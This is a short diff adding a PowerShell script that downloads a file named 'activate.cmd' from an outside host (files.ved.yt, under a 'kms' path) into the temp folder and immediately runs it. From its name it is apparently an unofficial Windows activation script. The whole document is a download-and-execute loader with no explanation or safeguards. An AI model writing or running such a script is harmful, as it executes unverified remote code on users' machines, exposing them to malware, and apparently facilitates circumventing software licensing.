@@ -1,0 +1,7 @@
+$url = "https://files.ved.yt/Files/kms/activate.cmd"
+$outpath = "$env:TEMP/activate.cmd"
+Invoke-WebRequest -Uri $url -OutFile $outpath
+
+$args = @("Comma","Separated","Arguments")
+Start-Process -Filepath "$env:TEMP/activate.cmd" -ArgumentList $args
+exit
